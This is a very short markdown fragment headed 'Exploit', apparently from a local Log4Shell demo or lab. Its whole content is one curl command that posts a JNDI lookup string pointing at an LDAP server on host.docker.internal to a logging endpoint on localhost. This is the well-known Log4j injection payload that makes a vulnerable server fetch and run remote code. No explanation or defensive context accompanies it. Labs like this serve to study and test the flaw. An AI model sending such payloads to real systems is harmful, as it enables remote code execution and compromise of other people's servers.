## Exploit
```curl -H 'Content-Type: text/plain' --data '${jndi:ldap://host.docker.internal:1389/a}' http://localhost:8080/log```
